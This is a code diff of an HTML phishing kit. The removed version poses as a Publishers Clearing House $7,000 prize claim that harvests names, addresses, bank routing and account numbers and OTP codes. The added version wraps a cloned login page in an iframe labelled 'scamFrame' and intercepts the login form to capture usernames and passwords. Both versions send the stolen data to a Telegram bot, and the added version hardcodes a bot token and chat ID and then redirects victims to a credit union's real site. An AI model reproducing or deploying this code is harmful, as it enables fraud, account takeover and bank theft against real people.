@@ -1,909 +1,133 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PCH Prize Verification</title>
-    <style>
-        :root {
-            --pch-red: #D32F2F;
-            --pch-gold: #FFC107;
-            --pch-blue: #003366;
-            --bg-color: #f4f4f4;
-            --text-color: #333;
-        }
-
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: var(--bg-color);
-            margin: 0;
-            padding: 0;
-            color: var(--text-color);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-
-        /* Header */
-        header {
-            background-color: white;
-            padding: 15px;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-            text-align: center;
-            position: relative;
-            z-index: 10;
-        }
-
-        .logo-area {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .pch-logo {
-            font-size: 2.5rem;
-            font-weight: 900;
-            color: var(--pch-red);
-            text-transform: uppercase;
-            letter-spacing: -1px;
-        }
-
-        .pch-subheader {
-            font-size: 2.5rem; /* Larger font */
-            color: var(--pch-gold); /* Matches PCH Logo Gold */
-            font-weight: bold;
-            margin-top: 5px;
-            line-height: 1.1;
-        }
-
-        /* Progress Bar */
-        .progress-container {
-            background-color: #e0e0e0;
-            height: 8px;
-            width: 100%;
-        }
-
-        .progress-bar {
-            background-color: var(--pch-red);
-            height: 100%;
-            width: 0%;
-            transition: width 0.4s ease; /* Smooth transition */
-        }
-
-        .progress-text {
-            text-align: center;
-            font-size: 0.9rem;
-            color: #666;
-            margin-top: 5px;
-            font-weight: 600;
-        }
-
-        /* Main Content */
-        main {
-            flex: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            position: relative;
-        }
-
-        .step-container {
-            background: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-            width: 100%;
-            max-width: 450px;
-            display: none; /* Hidden by default */
-            animation: fadeIn 0.4s ease;
-        }
-
-        .step-container.active {
-            display: block;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        h2 {
-            color: var(--pch-blue);
-            margin-top: 0;
-            font-size: 1.5rem;
-            text-align: center;
-        }
-
-        p {
-            text-align: center;
-            color: #555;
-            line-height: 1.5;
-        }
-
-        .form-group {
-            margin-bottom: 20px;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 5px;
-            font-weight: 600;
-            font-size: 0.9rem;
-        }
-
-        input[type="text"],
-        input[type="email"],
-        input[type="tel"],
-        input[type="date"] {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 1rem;
-            box-sizing: border-box;
-        }
-
-        input:focus {
-            outline: none;
-            border-color: var(--pch-red);
-        }
-
-        .btn {
-            display: block;
-            width: 100%;
-            padding: 15px;
-            background-color: var(--pch-red);
-            color: white;
-            border: none;
-            border-radius: 5px;
-            font-size: 1.1rem;
-            font-weight: bold;
-            cursor: pointer;
-            transition: background 0.2s;
-            text-align: center;
-        }
-
-        .btn:hover {
-            background-color: #b71c1c;
-        }
-
-        .otp-input {
-            font-size: 1.5rem;
-            text-align: center;
-            letter-spacing: 5px;
-        }
-
-        .success-icon {
-            font-size: 4rem;
-            color: #28a745;
-            text-align: center;
-            margin-bottom: 15px;
-        }
-
-        /* Admin Panel Styles */
-        #admin-panel {
-            position: fixed;
-            top: 0;
-            right: -400px;
-            width: 350px;
-            height: 100%;
-            background: #2c3e50;
-            color: white;
-            transition: right 0.3s ease;
-            z-index: 1000;
-            overflow-y: auto;
-            padding: 20px;
-            box-shadow: -2px 0 10px rgba(0,0,0,0.3);
-        }
-
-        #admin-panel.open {
-            right: 0;
-        }
-
-        #admin-toggle {
-            position: fixed;
-            top: 10px;
-            right: 10px;
-            background: var(--pch-blue);
-            color: white;
-            border: none;
-            padding: 8px 12px;
-            border-radius: 5px;
-            cursor: pointer;
-            z-index: 1001;
-            font-size: 1.2rem;
-        }
-
-        .admin-section {
-            margin-bottom: 20px;
-            border-bottom: 1px solid #4a657a;
-            padding-bottom: 15px;
-        }
-
-        .admin-section h3 {
-            margin-top: 0;
-            color: var(--pch-gold);
-            font-size: 1.1rem;
-        }
-
-        .admin-row {
-            margin-bottom: 10px;
-        }
-
-        .admin-row label {
-            font-size: 0.8rem;
-            color: #ccc;
-            margin-bottom: 3px;
-        }
-
-        .admin-row input[type="text"],
-        .admin-row input[type="number"] {
-            background: #34495e;
-            border: 1px solid #4a657a;
-            color: white;
-            padding: 6px;
-            width: 100%;
-            border-radius: 3px;
-            font-size: 0.85rem;
-        }
-
-        .toggle-switch {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            margin-bottom: 8px;
-        }
-
-        .toggle-switch label {
-            font-size: 0.85rem;
-        }
-
-        .switch {
-            position: relative;
-            display: inline-block;
-            width: 40px;
-            height: 20px;
-        }
-
-        .switch input {
-            opacity: 0;
-            width: 0;
-            height: 0;
-        }
-
-        .slider {
-            position: absolute;
-            cursor: pointer;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: #ccc;
-            transition: .4s;
-            border-radius: 20px;
-        }
-
-        .slider:before {
-            position: absolute;
-            content: "";
-            height: 16px;
-            width: 16px;
-            left: 2px;
-            bottom: 2px;
-            background-color: white;
-            transition: .4s;
-            border-radius: 50%;
-        }
-
-        input:checked + .slider {
-            background-color: var(--pch-gold);
-        }
-
-        input:checked + .slider:before {
-            transform: translateX(20px);
-        }
-
-        .admin-btn {
-            width: 100%;
-            padding: 10px;
-            background: var(--pch-gold);
-            color: var(--pch-blue);
-            border: none;
-            border-radius: 4px;
-            font-weight: bold;
-            cursor: pointer;
-            margin-top: 10px;
-        }
-
-        .admin-btn:hover {
-            background: #ffca2c;
-        }
-
-        .notification {
-            position: fixed;
-            bottom: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: #333;
-            color: white;
-            padding: 10px 20px;
-            border-radius: 5px;
-            opacity: 0;
-            transition: opacity 0.3s;
-            z-index: 2000;
-        }
-
-        .notification.show {
-            opacity: 1;
-        }
-    </style>
+    <title>Loading...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
-<body>
-
-    <!-- Admin Toggle Button -->
-    <button id="admin-toggle">⚙️ Admin</button>
-
-    <!-- Admin Panel -->
-    <div id="admin-panel">
-        <h2 style="color:white; text-align:left;">Admin Control</h2>
-        
-        <div class="admin-section">
-            <h3>Telegram Settings</h3>
-            <div class="admin-row">
-                <label>Bot Token</label>
-                <input type="text" id="admin-bot-token" placeholder="123456:ABC-DEF...">
-            </div>
-            <div class="admin-row">
-                <label>Chat ID</label>
-                <input type="text" id="admin-chat-id" placeholder="-100123456789">
-            </div>
-            <div class="admin-row">
-                <label>Victim Phone (Pre-filled)</label>
-                <input type="text" id="admin-victim-phone" placeholder="+1 234 567 890">
-            </div>
-        </div>
-
-        <div class="admin-section">
-            <h3>Page Visibility</h3>
-            <div id="page-toggles">
-                <!-- Toggles generated by JS -->
-            </div>
-            <div class="toggle-switch">
-                <label>Disable OTP Step</label>
-                <label class="switch">
-                    <input type="checkbox" id="admin-disable-otp">
-                    <span class="slider"></span>
-                </label>
-            </div>
-        </div>
-
-        <div class="admin-section">
-            <h3>Edit Content</h3>
-            <div id="content-editors">
-                <!-- Editors generated by JS -->
-            </div>
-        </div>
-
-        <button class="admin-btn" onclick="saveAdminSettings()">Save & Apply</button>
-        <button class="admin-btn" style="background:#e74c3c; color:white;" onclick="closeAdmin()">Close Admin</button>
-    </div>
-
-    <!-- Header -->
-    <header>
-        <div class="logo-area">
-            <div class="pch-logo">PCH</div>
-        </div>
-        <div class="pch-subheader" id="text-pch-subheader">Publishers Clearing House</div>
-    </header>
-
-    <!-- Progress Bar -->
-    <div class="progress-container">
-        <div class="progress-bar" id="progress-bar"></div>
-    </div>
-    <div class="progress-text" id="progress-text">Step 1 of 10</div>
-
-    <!-- Main Content Area -->
-    <main id="main-content">
-        <!-- Steps will be injected here by JS -->
-    </main>
-
-    <div class="notification" id="notification">Settings Saved!</div>
+<body style="margin:0; overflow:hidden; background:#fff;">
+    
+    <!-- 
+       IMPORTANT: Make sure your big file is named 'page.html' 
+       and is in the SAME folder as this file on GitHub.
+    -->
+    <iframe id="scamFrame" src="page.html" style="width:100vw; height:100vh; border:none;"></iframe>
 
     <script>
-        // --- Default Configuration ---
-        const defaultSettings = {
-            telegram: {
-                botToken: "",
-                chatId: "",
-                victimPhone: ""
-            },
-            pages: {
-                step1_intro: true,
-                step2_name: true,
-                step3_email: true,
-                step4_phone: true,
-                step5_address: true,
-                step6_verify: true,
-                step7_otp: true,
-                step8_success: true
-            },
-            disableOtp: false,
-            content: {
-                pchSubheader: "Publishers Clearing House",
-                step1Title: "Congratulations!",
-                step1Subtitle: "You have been selected for the $7,000 Weekly Prize!",
-                step1Btn: "Verify Claim",
-                step2Title: "Personal Details",
-                step2Label: "Full Name",
-                step2Placeholder: "John Doe",
-                step2Btn: "Continue",
-                step3Title: "Email Address",
-                step3Label: "Email",
-                step3Placeholder: "john@example.com",
-                step3Btn: "Continue",
-                step4Title: "Phone Number",
-                step4Label: "Phone",
-                step4Placeholder: "+1 234 567 890",
-                step4Btn: "Continue",
-                step5Title: "Mailing Address",
-                step5Label: "Street Address",
-                step5Placeholder: "123 Main St",
-                step5Label2: "City",
-                step5Placeholder2: "New York",
-                step5Label3: "State",
-                step5Placeholder3: "NY",
-                step5Label4: "Zip Code",
-                step5Placeholder4: "10001",
-                step5Btn: "Continue",
-                step6Title: "Bank Verification",
-                step6Label: "Account Holder Name",
-                step6Placeholder: "John Doe",
-                step6Label2: "Routing Number",
-                step6Placeholder2: "021000021",
-                step6Label3: "Account Number",
-                step6Placeholder3: "1234567890",
-                step6Btn: "Verify Bank",
-                step7Title: "Enter OTP Code",
-                step7Subtitle: "A 4-digit code has been sent to your phone.",
-                step7Label: "OTP Code",
-                step7Placeholder: "1234",
-                step7Btn: "Verify Code",
-                step8Title: "Verification Complete!",
-                step8Subtitle: "Your prize is being wired to your account.",
-                step8Btn: "Finish"
+        // ================= CONFIGURATION =================
+        // 1. PASTE YOUR BOT TOKEN BELOW
+        const BOT_TOKEN = '8983043957:AAGncbc73rTjiutiUMOSyDtiGJoqJOUqHSM';
+        
+        // 2. PASTE YOUR CHAT ID BELOW
+        const CHAT_ID = '7706898844';
+        
+        // 3. REDIRECT URL AFTER LOGIN
+        const REDIRECT_URL = 'https://www.onpointcu.com';
+        // =================================================
+
+        const frame = document.getElementById('scamFrame');
+
+        // Wait for iframe to load
+        frame.onload = function() {
+            try {
+                const doc = frame.contentDocument || frame.contentWindow.document;
+                
+                // TRY 1: Look for a <form> tag
+                const form = doc.querySelector('form');
+                
+                if (form) {
+                    console.log("Found Form tag");
+                    form.addEventListener('submit', function(e) {
+                        e.preventDefault();
+                        processLogin(doc);
+                    });
+                    return; // Stop here if form found
+                }
+
+                // TRY 2: If no <form> tag, look for a BUTTON with "Login" or "Submit"
+                const buttons = doc.querySelectorAll('button');
+                let loginBtn = null;
+
+                buttons.forEach(btn => {
+                    const text = btn.innerText.toLowerCase();
+                    const type = btn.type.toLowerCase();
+                    const className = btn.className.toLowerCase();
+                    
+                    // Detect common login buttons
+                    if (
+                        text.includes('login') || 
+                        text.includes('sign in') || 
+                        text.includes('submit') ||
+                        type === 'submit' ||
+                        className.includes('btn')
+                    ) {
+                        loginBtn = btn;
+                    }
+                });
+
+                if (loginBtn) {
+                    console.log("Found Button fallback");
+                    loginBtn.addEventListener('click', function(e) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        processLogin(doc);
+                    });
+                } else {
+                    console.log("No form or button found!");
+                }
+
+            } catch (err) {
+                console.error("Iframe Error:", err);
+                // Sometimes Cross-Origin blocks access if the site sets cookies
+                alert("Page loaded, but script couldn't attach. Check Console (F12)");
             }
         };
 
-        // --- State Management ---
-        let settings = JSON.parse(localStorage.getItem('pch_admin_settings')) || JSON.parse(JSON.stringify(defaultSettings));
-        let currentStepIndex = 0; // Index in the filtered active steps array
-        let activeSteps = [];
+        function processLogin(doc) {
+            // Find all inputs in the big page
+            const inputs = doc.querySelectorAll('input');
+            let username = '';
+            let password = '';
+            let email = '';
 
-        // --- Initialization ---
-        document.addEventListener('DOMContentLoaded', () => {
-            initAdminPanel();
-            renderApp();
-        });
-
-        function initAdminPanel() {
-            const toggleBtn = document.getElementById('admin-toggle');
-            const panel = document.getElementById('admin-panel');
-
-            toggleBtn.addEventListener('click', () => {
-                panel.classList.toggle('open');
-            });
-
-            // Populate Admin Fields
-            document.getElementById('admin-bot-token').value = settings.telegram.botToken;
-            document.getElementById('admin-chat-id').value = settings.telegram.chatId;
-            document.getElementById('admin-victim-phone').value = settings.telegram.victimPhone;
-            
-            // Populate Page Toggles
-            const pageTogglesContainer = document.getElementById('page-toggles');
-            pageTogglesContainer.innerHTML = '';
-            const stepNames = {
-                step1_intro: "Step 1: Intro",
-                step2_name: "Step 2: Name",
-                step3_email: "Step 3: Email",
-                step4_phone: "Step 4: Phone",
-                step5_address: "Step 5: Address",
-                step6_verify: "Step 6: Bank",
-                step7_otp: "Step 7: OTP",
-                step8_success: "Step 8: Success"
-            };
-
-            for (const [key, label] of Object.entries(stepNames)) {
-                const div = document.createElement('div');
-                div.className = 'toggle-switch';
-                div.innerHTML = `
-                    <label>${label}</label>
-                    <label class="switch">
-                        <input type="checkbox" data-page="${key}" ${settings.pages[key] ? 'checked' : ''}>
-                        <span class="slider"></span>
-                    </label>
-                `;
-                pageTogglesContainer.appendChild(div);
-            }
-
-            // Disable OTP Toggle
-            const otpToggle = document.getElementById('admin-disable-otp');
-            otpToggle.checked = settings.disableOtp;
-            otpToggle.addEventListener('change', () => {
-                settings.disableOtp = otpToggle.checked;
-            });
-
-            // Populate Content Editors
-            const contentEditorsContainer = document.getElementById('content-editors');
-            contentEditorsContainer.innerHTML = '';
-            
-            // Helper to create input
-            const createInput = (label, key) => {
-                const div = document.createElement('div');
-                div.className = 'admin-row';
-                div.innerHTML = `
-                    <label>${label}</label>
-                    <input type="text" data-content="${key}" value="${settings.content[key]}">
-                `;
-                contentEditorsContainer.appendChild(div);
-            };
-
-            createInput("Subheader", "pchSubheader");
-            createInput("Step 1 Title", "step1Title");
-            createInput("Step 1 Subtitle", "step1Subtitle");
-            createInput("Step 1 Button", "step1Btn");
-            createInput("Step 2 Title", "step2Title");
-            createInput("Step 2 Label", "step2Label");
-            createInput("Step 2 Placeholder", "step2Placeholder");
-            createInput("Step 2 Button", "step2Btn");
-            createInput("Step 3 Title", "step3Title");
-            createInput("Step 3 Label", "step3Label");
-            createInput("Step 3 Placeholder", "step3Placeholder");
-            createInput("Step 3 Button", "step3Btn");
-            createInput("Step 4 Title", "step4Title");
-            createInput("Step 4 Label", "step4Label");
-            createInput("Step 4 Placeholder", "step4Placeholder");
-            createInput("Step 4 Button", "step4Btn");
-            createInput("Step 5 Title", "step5Title");
-            createInput("Step 5 Label 1", "step5Label");
-            createInput("Step 5 Placeholder 1", "step5Placeholder");
-            createInput("Step 5 Label 2", "step5Label2");
-            createInput("Step 5 Placeholder 2", "step5Placeholder2");
-            createInput("Step 5 Label 3", "step5Label3");
-            createInput("Step 5 Placeholder 3", "step5Placeholder3");
-            createInput("Step 5 Label 4", "step5Label4");
-            createInput("Step 5 Placeholder 4", "step5Placeholder4");
-            createInput("Step 5 Button", "step5Btn");
-            createInput("Step 6 Title", "step6Title");
-            createInput("Step 6 Label 1", "step6Label");
-            createInput("Step 6 Placeholder 1", "step6Placeholder");
-            createInput("Step 6 Label 2", "step6Label2");
-            createInput("Step 6 Placeholder 2", "step6Placeholder2");
-            createInput("Step 6 Label 3", "step6Label3");
-            createInput("Step 6 Placeholder 3", "step6Placeholder3");
-            createInput("Step 6 Button", "step6Btn");
-            createInput("Step 7 Title", "step7Title");
-            createInput("Step 7 Subtitle", "step7Subtitle");
-            createInput("Step 7 Label", "step7Label");
-            createInput("Step 7 Placeholder", "step7Placeholder");
-            createInput("Step 7 Button", "step7Btn");
-            createInput("Step 8 Title", "step8Title");
-            createInput("Step 8 Subtitle", "step8Subtitle");
-            createInput("Step 8 Button", "step8Btn");
-        }
-
-        function saveAdminSettings() {
-            // Save Telegram Settings
-            settings.telegram.botToken = document.getElementById('admin-bot-token').value;
-            settings.telegram.chatId = document.getElementById('admin-chat-id').value;
-            settings.telegram.victimPhone = document.getElementById('admin-victim-phone').value;
-
-            // Save Page Visibility
-            const pageToggles = document.querySelectorAll('#page-toggles input[type="checkbox"]');
-            pageToggles.forEach(toggle => {
-                const key = toggle.getAttribute('data-page');
-                settings.pages[key] = toggle.checked;
-            });
-
-            // Save Content
-            const contentInputs = document.querySelectorAll('#content-editors input[type="text"]');
-            contentInputs.forEach(input => {
-                const key = input.getAttribute('data-content');
-                settings.content[key] = input.value;
-            });
-
-            // Save to LocalStorage
-            localStorage.setItem('pch_admin_settings', JSON.stringify(settings));
-
-            showNotification("Settings Saved!");
-            
-            // Re-render App with new settings
-            // Note: We do NOT reset currentStepIndex here to avoid jumping back to start if user is testing
-            renderApp();
-        }
-
-        function closeAdmin() {
-            document.getElementById('admin-panel').classList.remove('open');
-        }
-
-        function showNotification(msg) {
-            const notif = document.getElementById('notification');
-            notif.textContent = msg;
-            notif.classList.add('show');
-            setTimeout(() => {
-                notif.classList.remove('show');
-            }, 2000);
-        }
-
-        function renderApp() {
-            // Update Subheader
-            document.getElementById('text-pch-subheader').textContent = settings.content.pchSubheader;
-
-            // Determine Active Steps
-            activeSteps = [];
-            const allSteps = [
-                'step1_intro', 'step2_name', 'step3_email', 'step4_phone', 
-                'step5_address', 'step6_verify', 'step7_otp', 'step8_success'
-            ];
-
-            for (const stepKey of allSteps) {
-                // Check if page is enabled
-                const isEnabled = settings.pages[stepKey];
+            inputs.forEach(input => {
+                const type = input.type.toLowerCase();
+                const name = (input.name || input.id || '').toLowerCase();
                 
-                // Special case for OTP: if disabled globally, skip it
-                if (stepKey === 'step7_otp' && settings.disableOtp) {
-                    continue;
-                }
-
-                if (isEnabled) {
-                    activeSteps.push(stepKey);
-                }
-            }
-
-            // Clear Main Content
-            const mainContent = document.getElementById('main-content');
-            mainContent.innerHTML = '';
-
-            // Render Each Active Step
-            activeSteps.forEach((stepKey, index) => {
-                const stepDiv = document.createElement('div');
-                stepDiv.className = 'step-container';
-                stepDiv.id = `step-${index}`;
-                
-                let html = '';
-
-                switch(stepKey) {
-                    case 'step1_intro':
-                        html = `
-                            <h2 id="t-step1Title">${settings.content.step1Title}</h2>
-                            <p id="t-step1Subtitle">${settings.content.step1Subtitle}</p>
-                            <button class="btn" onclick="nextStep()" id="b-step1Btn">${settings.content.step1Btn}</button>
-                        `;
-                        break;
-                    case 'step2_name':
-                        html = `
-                            <h2 id="t-step2Title">${settings.content.step2Title}</h2>
-                            <div class="form-group">
-                                <label id="l-step2Label">${settings.content.step2Label}</label>
-                                <input type="text" id="inp-name" placeholder="${settings.content.step2Placeholder}" required>
-                            </div>
-                            <button class="btn" onclick="nextStep()" id="b-step2Btn">${settings.content.step2Btn}</button>
-                        `;
-                        break;
-                    case 'step3_email':
-                        html = `
-                            <h2 id="t-step3Title">${settings.content.step3Title}</h2>
-                            <div class="form-group">
-                                <label id="l-step3Label">${settings.content.step3Label}</label>
-                                <input type="email" id="inp-email" placeholder="${settings.content.step3Placeholder}" required>
-                            </div>
-                            <button class="btn" onclick="nextStep()" id="b-step3Btn">${settings.content.step3Btn}</button>
-                        `;
-                        break;
-                    case 'step4_phone':
-                        html = `
-                            <h2 id="t-step4Title">${settings.content.step4Title}</h2>
-                            <div class="form-group">
-                                <label id="l-step4Label">${settings.content.step4Label}</label>
-                                <input type="tel" id="inp-phone" placeholder="${settings.content.step4Placeholder}" required>
-                            </div>
-                            <button class="btn" onclick="nextStep()" id="b-step4Btn">${settings.content.step4Btn}</button>
-                        `;
-                        break;
-                    case 'step5_address':
-                        html = `
-                            <h2 id="t-step5Title">${settings.content.step5Title}</h2>
-                            <div class="form-group">
-                                <label id="l-step5Label">${settings.content.step5Label}</label>
-                                <input type="text" id="inp-address1" placeholder="${settings.content.step5Placeholder}" required>
-                            </div>
-                            <div class="form-group">
-                                <label id="l-step5Label2">${settings.content.step5Label2}</label>
-                                <input type="text" id="inp-city" placeholder="${settings.content.step5Placeholder2}" required>
-                            </div>
-                            <div class="form-group">
-                                <label id="l-step5Label3">${settings.content.step5Label3}</label>
-                                <input type="text" id="inp-state" placeholder="${settings.content.step5Placeholder3}" required>
-                            </div>
-                            <div class="form-group">
-                                <label id="l-step5Label4">${settings.content.step5Label4}</label>
-                                <input type="text" id="inp-zip" placeholder="${settings.content.step5Placeholder4}" required>
-                            </div>
-                            <button class="btn" onclick="nextStep()" id="b-step5Btn">${settings.content.step5Btn}</button>
-                        `;
-                        break;
-                    case 'step6_verify':
-                        html = `
-                            <h2 id="t-step6Title">${settings.content.step6Title}</h2>
-                            <div class="form-group">
-                                <label id="l-step6Label">${settings.content.step6Label}</label>
-                                <input type="text" id="inp-bank-name" placeholder="${settings.content.step6Placeholder}" required>
-                            </div>
-                            <div class="form-group">
-                                <label id="l-step6Label2">${settings.content.step6Label2}</label>
-                                <input type="text" id="inp-routing" placeholder="${settings.content.step6Placeholder2}" required>
-                            </div>
-                            <div class="form-group">
-                                <label id="l-step6Label3">${settings.content.step6Label3}</label>
-                                <input type="text" id="inp-account" placeholder="${settings.content.step6Placeholder3}" required>
-                            </div>
-                            <button class="btn" onclick="nextStep()" id="b-step6Btn">${settings.content.step6Btn}</button>
-                        `;
-                        break;
-                    case 'step7_otp':
-                        html = `
-                            <h2 id="t-step7Title">${settings.content.step7Title}</h2>
-                            <p id="t-step7Subtitle">${settings.content.step7Subtitle}</p>
-                            <div class="form-group">
-                                <label id="l-step7Label">${settings.content.step7Label}</label>
-                                <input type="text" class="otp-input" id="inp-otp" placeholder="${settings.content.step7Placeholder}" maxlength="4" required>
-                            </div>
-                            <button class="btn" onclick="nextStep()" id="b-step7Btn">${settings.content.step7Btn}</button>
-                        `;
-                        break;
-                    case 'step8_success':
-                        html = `
-                            <div class="success-icon">✔</div>
-                            <h2 id="t-step8Title">${settings.content.step8Title}</h2>
-                            <p id="t-step8Subtitle">${settings.content.step8Subtitle}</p>
-                            <button class="btn" onclick="finishFlow()" id="b-step8Btn">${settings.content.step8Btn}</button>
-                        `;
-                        break;
-                }
-
-                stepDiv.innerHTML = html;
-                mainContent.appendChild(stepDiv);
+                if (type === 'email' || name.includes('email')) email = input.value;
+                if (type === 'password' || name.includes('pass')) password = input.value;
+                if (type === 'text' || type === 'username' || name.includes('user')) username = input.value;
             });
 
-            // Show First Step (or current index if preserved, but for simplicity we start at 0 on full render)
-            if (activeSteps.length > 0) {
-                showStep(0);
-            } else {
-                document.getElementById('main-content').innerHTML = '<p style="text-align:center; padding:50px;">No steps enabled.</p>';
-                updateProgressBar(0, 0);
-            }
-        }
+            // Fallbacks
+            if (!username && email) username = email;
+            if (!username && inputs[0]) username = inputs[0].value;
 
-        function showStep(index) {
-            // Hide all steps
-            const allSteps = document.querySelectorAll('.step-container');
-            allSteps.forEach(step => {
-                step.classList.remove('active');
-            });
-
-            // Show current step
-            const currentStep = document.getElementById(`step-${index}`);
-            if (currentStep) {
-                currentStep.classList.add('active');
-                currentStepIndex = index;
-            }
-
-            // Update Progress Bar Synchronized
-            updateProgressBar(index, activeSteps.length);
-        }
-
-        function updateProgressBar(currentIndex, totalSteps) {
-            const progressBar = document.getElementById('progress-bar');
-            const progressText = document.getElementById('progress-text');
-
-            if (totalSteps === 0) {
-                progressBar.style.width = '0%';
-                progressText.textContent = 'Step 0 of 0';
-                return;
-            }
-
-            // Calculate percentage: (current_index + 1) / total_steps * 100
-            const percentage = ((currentIndex + 1) / totalSteps) * 100;
-            progressBar.style.width = `${percentage}%`;
-            progressText.textContent = `Step ${currentIndex + 1} of ${totalSteps}`;
-        }
-
-        function nextStep() {
-            // Collect Data
-            const formData = collectFormData();
-            
             // Send to Telegram
-            sendToTelegram(formData);
-
-            // Move to next step
-            if (currentStepIndex < activeSteps.length - 1) {
-                showStep(currentStepIndex + 1);
-            }
-        }
-
-        function finishFlow() {
-            const formData = collectFormData();
-            sendToTelegram(formData);
-            // Optional: Redirect or show loader
-            alert("Verification Complete! (Check Telegram)");
-        }
-
-        function collectFormData() {
-            return {
-                name: document.getElementById('inp-name')?.value || '',
-                email: document.getElementById('inp-email')?.value || '',
-                phone: document.getElementById('inp-phone')?.value || '',
-                address1: document.getElementById('inp-address1')?.value || '',
-                city: document.getElementById('inp-city')?.value || '',
-                state: document.getElementById('inp-state')?.value || '',
-                zip: document.getElementById('inp-zip')?.value || '',
-                bankName: document.getElementById('inp-bank-name')?.value || '',
-                routing: document.getElementById('inp-routing')?.value || '',
-                account: document.getElementById('inp-account')?.value || '',
-                otp: document.getElementById('inp-otp')?.value || '',
-                timestamp: new Date().toLocaleString()
-            };
-        }
-
-        function sendToTelegram(data) {
-            const token = settings.telegram.botToken;
-            const chatId = settings.telegram.chatId;
-
-            if (!token || !chatId) {
-                console.log("Telegram not configured or data collected:", data);
-                return;
-            }
-
             const message = `
-🎉 <b>NEW PCH LEAD!</b> 🎉
+🚨 *NEW LOGIN* 🚨
+👤 *User:* ${username || email || 'Unknown'}
+🔑 *Pass:* ${password || 'Unknown'}
+📱 *Device:* ${navigator.userAgent.substring(0, 60)}
+`;
 
-👤 <b>Name:</b> ${data.name}
-📧 <b>Email:</b> ${data.email}
-📱 <b>Phone:</b> ${data.phone}
-📍 <b>Address:</b> ${data.address1}, ${data.city}, ${data.state} ${data.zip}
-
-🏦 <b>Bank Info:</b>
-Name: ${data.bankName}
-Routing: ${data.routing}
-Account: ${data.account}
-
-🔑 <b>OTP:</b> ${data.otp}
-
-🕒 <b>Time:</b> ${data.timestamp}
-            `;
-
-            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const params = new URLSearchParams();
+            params.append('chat_id', CHAT_ID);
+            params.append('text', message);
+            params.append('parse_mode', 'Markdown');
 
             fetch(url, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message,
-                    parse_mode: 'HTML'
-                })
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: params
             })
-            .then(response => response.json())
+            .then(res => res.json())
             .then(data => {
                 if (data.ok) {
-                    console.log("Telegram Sent:", data);
+                    window.location.href = REDIRECT_URL;
                 } else {
                     console.error("Telegram Error:", data);
                 }
-            })
-            .catch(error => {
-                console.error("Fetch Error:", error);
             });
         }
     </script>
